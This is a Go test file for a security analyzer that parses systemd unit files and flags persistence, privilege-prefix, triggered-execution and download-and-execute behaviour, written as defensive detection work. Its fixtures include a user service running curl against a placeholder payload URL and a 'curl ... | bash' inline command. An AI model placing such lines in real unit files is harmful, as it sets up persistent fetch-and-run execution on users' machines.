package analyze

import (
	"strings"
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestSystemdServiceRecordsExecAndInstallMetadata(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"systemd/user/fetch.service": []byte("[Service]\nExecStart=/usr/bin/curl https://example.test/payload\n[Install]\nWantedBy=default.target\n"),
	}))
	if len(result.Operations) != 2 || result.Operations[0].Command != "/usr/bin/curl" || result.Operations[0].Category != "process-execution-via-systemd-unit" || result.Operations[1].Category != "systemd-install-metadata" {
		t.Fatalf("systemd operations = %#v", result.Operations)
	}
	if !hasFindingCategory(result, "persistence") {
		if !hasFindingCategory(result, "persistent-service-execution") {
			t.Fatalf("systemd install/exec correlation missing: %#v", result.Findings)
		}
	}
	foundDomain := false
	for _, resource := range result.Resources {
		if resource.Kind == "network-domain" && resource.Value == "example.test" {
			foundDomain = true
		}
	}
	if !foundDomain {
		t.Fatalf("systemd ExecStart capability was not derived: %#v", result.Resources)
	}
}

func TestSystemdInstallMetadataAloneDoesNotClaimPersistentExecution(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"metadata.target": []byte("[Install]\nWantedBy=default.target\n"),
	}))
	if !hasFindingCategory(result, "systemd-install-metadata") || hasFindingCategory(result, "persistent-service-execution") || hasFindingCategory(result, "persistence") {
		t.Fatalf("install metadata alone overstated execution: %#v", result.Findings)
	}
}

func TestSystemdTimerCorrelatesDefaultServiceExecution(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"units/refresh.timer":   []byte("[Timer]\nOnCalendar=hourly\n"),
		"units/refresh.service": []byte("[Service]\nExecStart=/usr/bin/refresh\n"),
	}))
	if !hasFindingCategory(result, "service-activation-metadata") || !hasFindingCategory(result, "triggered-service-execution") {
		t.Fatalf("timer/service evidence chain missing: %#v", result.Findings)
	}
	finding := findingByCategory(t, result, "triggered-service-execution")
	if finding.Claim != report.ClaimInference || len(finding.Related) != 2 || len(finding.Evidence) != 2 {
		t.Fatalf("timer/service inference provenance = %#v", finding)
	}
}

func TestSystemdExplicitUnitReferenceCorrelatesOnlySafeExactTarget(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"units/watch.path":     []byte("[Path]\nPathChanged=%h/input\nUnit=worker.service\n"),
		"units/worker.service": []byte("[Service]\nExecStart=/usr/bin/worker\n"),
		"units/watch.service":  []byte("[Service]\nExecStart=/usr/bin/wrong\n"),
	}))
	if !hasFindingCategory(result, "triggered-service-execution") || len(result.Unknowns) != 1 || result.Unknowns[0].Reason != report.UnknownDynamicValue {
		t.Fatalf("explicit path-unit relationship or dynamic trigger missing: %#v", result)
	}
	finding := findingByCategory(t, result, "triggered-service-execution")
	for _, evidence := range finding.Evidence {
		if strings.Contains(evidence.Operation, "/usr/bin/wrong") {
			t.Fatalf("default target was correlated despite explicit Unit=: %#v", finding)
		}
	}
}

func TestSystemdUnsafeOrMissingUnitReferenceDoesNotGuessTarget(t *testing.T) {
	for _, target := range []string{"../worker.service", "%i.service", "missing.service"} {
		result := Sources(withValidManifest(map[string][]byte{
			"units/watch.timer":   []byte("[Timer]\nOnCalendar=hourly\nUnit=" + target + "\n"),
			"units/watch.service": []byte("[Service]\nExecStart=/usr/bin/watch\n"),
		}))
		if hasFindingCategory(result, "triggered-service-execution") {
			t.Fatalf("unsafe/missing target %q was guessed: %#v", target, result.Findings)
		}
	}
}

func TestSystemdRepeatedExecDirectivesRemainSeparateFacts(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"worker.service": []byte("[Service]\nType=oneshot\nExecStart=/bin/first\nExecStart=/bin/second\nExecStartPost=/bin/third\n"),
	}))
	if len(result.Operations) != 3 || len(result.Unknowns) != 0 {
		t.Fatalf("valid repeated systemd commands became ambiguous: %#v", result)
	}
}

func TestSystemdSubstitutionAndPrivilegePrefixesAreExplicit(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"worker.service": []byte("[Service]\nExecStart=+%h/bin/helper $ARG\n"),
	}))
	if len(result.Operations) != 1 || result.Operations[0].Command != "<dynamic>" || !result.Operations[0].Dynamic || len(result.Unknowns) != 1 || result.Unknowns[0].Reason != report.UnknownDynamicValue {
		t.Fatalf("systemd substitution unknown = %#v", result)
	}
	if !hasFindingCategory(result, "privilege-escalation") {
		t.Fatalf("systemd privilege prefix was omitted: %#v", result.Findings)
	}
}

func TestSystemdLiteralEscapesAndColonPrefixAvoidFalseDynamic(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"worker.service": []byte("[Service]\nExecStart=:/bin/echo %% $LITERAL\n"),
	}))
	if len(result.Operations) != 1 || result.Operations[0].Dynamic || len(result.Unknowns) != 0 || result.Operations[0].Command != "/bin/echo" {
		t.Fatalf("literal systemd escapes became dynamic: %#v", result)
	}
	if got := result.Operations[0].Arguments; len(got) != 2 || got[0] != "%" || got[1] != "$LITERAL" {
		t.Fatalf("literal systemd arguments = %#v", got)
	}
}

func TestSystemdContinuationHasBoundedEvidence(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"worker.service": []byte("[Service]\nExecStart=/bin/echo first \\\n  second\n"),
	}))
	if len(result.Operations) != 1 || len(result.Operations[0].Arguments) != 2 || result.Operations[0].Evidence.LineStart != 2 || result.Operations[0].Evidence.LineEnd != 3 {
		t.Fatalf("systemd continued directive = %#v", result.Operations)
	}
}

func TestSystemdInlineProgramsPreserveParsedAndUnknownBehavior(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"shell.service":  []byte("[Service]\nExecStart=/bin/bash -c \"curl https://example.test/install | bash\"\n"),
		"python.service": []byte("[Service]\nExecStart=/usr/bin/python -c \"import os; os.system('id')\"\n"),
	}))
	if !hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("systemd inline shell correlation missing: %#v", result.Findings)
	}
	foundInlineUnknown := false
	for _, unknown := range result.Unknowns {
		if unknown.Reason == report.UnknownUnsupportedSyntax && len(unknown.Evidence) > 0 && unknown.Evidence[0].Path == "python.service" {
			foundInlineUnknown = true
		}
	}
	if !foundInlineUnknown || !hasLimitationCode(result, "inline-dynamic-language-analysis-unavailable") {
		t.Fatalf("systemd inline Python gap is not explicit: %#v", result)
	}
}

func TestSystemdIgnoresCommentsSectionsAndEmptyReset(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"worker.service": []byte("# ExecStart=/bin/sudo\n[Unit]\nExecStart=/bin/pkexec\n[Service]\nExecStart=\n; ExecStart=/bin/su\n"),
	}))
	if len(result.Operations) != 0 || len(result.Findings) != 0 || len(result.Unknowns) != 0 {
		t.Fatalf("systemd lookalikes/reset produced behavior: %#v", result)
	}
}

func TestSystemdMalformedCommandFailsWithoutGuessing(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"worker.service": []byte("[Service]\nExecStart=\"/bin/unterminated\n"),
	}))
	if len(result.Operations) != 0 || len(result.Unknowns) != 1 || result.Unknowns[0].Reason != report.UnknownUnsupportedSyntax || !hasLimitationCode(result, "systemd-exec-unresolved") {
		t.Fatalf("malformed systemd command was guessed: %#v", result)
	}
}

func TestSystemdInvalidTextAndIncompleteContinuationFailClosed(t *testing.T) {
	for _, test := range []struct {
		name       string
		data       []byte
		reason     report.UnknownReason
		limitation string
	}{
		{"invalid.service", []byte{'[', 0xff, ']'}, report.UnknownParserFailure, "systemd-unit-invalid-text"},
		{"continued.service", []byte("[Service]\nExecStart=/bin/echo \\"), report.UnknownUnsupportedSyntax, "systemd-unit-incomplete-continuation"},
	} {
		result := Sources(withValidManifest(map[string][]byte{test.name: test.data}))
		if len(result.Operations) != 0 || len(result.Unknowns) != 1 || result.Unknowns[0].Reason != test.reason || !hasLimitationCode(result, test.limitation) {
			t.Fatalf("%s did not fail closed: %#v", test.name, result)
		}
	}
}

func TestSystemdDropInAndLineBudgetCoverage(t *testing.T) {
	if !isSystemdUnitPath("units/example.service.d/override.conf") || isSystemdUnitPath("ordinary.conf") {
		t.Fatal("systemd drop-in path classification is incorrect")
	}
	source := "[Service]\n" + strings.Repeat("Environment=X=1\n", maxSystemdLines)
	result := Sources(withValidManifest(map[string][]byte{"large.service": []byte(source)}))
	if len(result.Unknowns) != 1 || result.Unknowns[0].Reason != report.UnknownBudgetExhaustion || !hasLimitationCode(result, "systemd-unit-line-budget") {
		t.Fatalf("systemd line budget was not explicit: %#v", result)
	}
	assertAnalyzerResult(t, result)
}

func TestSystemdOversizedTokenBecomesDynamicWithoutResultAmplification(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"large-token.service": []byte("[Service]\nExecStart=/bin/echo " + strings.Repeat("x", report.MaxHostileStringBytes*2) + "\n"),
	}))
	if len(result.Operations) != 1 || !result.Operations[0].Dynamic || len(result.Unknowns) != 1 || result.Operations[0].Arguments[0] != "<dynamic>" {
		t.Fatalf("oversized unit token was retained or lost silently: %#v", result)
	}
	assertAnalyzerResult(t, result)
}
